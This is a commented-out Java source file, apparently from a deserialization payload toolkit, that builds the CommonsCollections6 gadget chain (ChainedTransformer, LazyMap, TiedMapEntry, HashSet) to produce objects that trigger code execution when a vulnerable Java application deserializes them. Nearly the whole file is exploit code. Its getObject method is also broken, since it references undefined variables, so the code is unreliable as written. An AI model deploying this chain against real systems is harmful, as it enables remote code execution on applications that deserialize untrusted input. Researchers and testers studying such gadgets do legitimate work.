//package com.ppp.chain.collections3;
//
//import com.ppp.ObjectPayload;
//import com.ppp.secmgr.PayloadRunner;
//import com.ppp.utils.Reflections;
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.keyvalue.TiedMapEntry;
//import org.apache.commons.collections.map.LazyMap;
//
//import java.util.HashMap;
//import java.util.HashSet;
//import java.util.Map;
//
///**
// * @author Whoopsunix
// */
//public class CommonsCollections6 implements ObjectPayload<Object> {
//
//    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(CommonsCollections6.class, args);
//    }
//
//    public Object getObject(String payload) throws Exception {
//
//
//        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
//        Object gadgetObject = commonsCollections6.getChain(sinkObject);
//
//
//        return kickOffObject;
//    }
//
//    public Object getChain(Transformer[] transformers) throws Exception {
//        final Transformer transformerChain = new ChainedTransformer(
//                new Transformer[]{new ConstantTransformer(1)});
//
//        final Map innerMap = new HashMap();
//        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//        TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
//
////        // way A
////        HashMap hashMap = new HashMap();
////        hashMap.put(entry, "x");
////        lazyMap.clear();
////
////        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
////
////        return hashMap;
//
//        // way B
//        HashMap hashMap = new HashMap();
//        hashMap.put(entry, "x");
//        HashSet hashSet = new HashSet(hashMap.keySet());
//        lazyMap.clear();
//        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
//        return hashSet;
//    }
//}
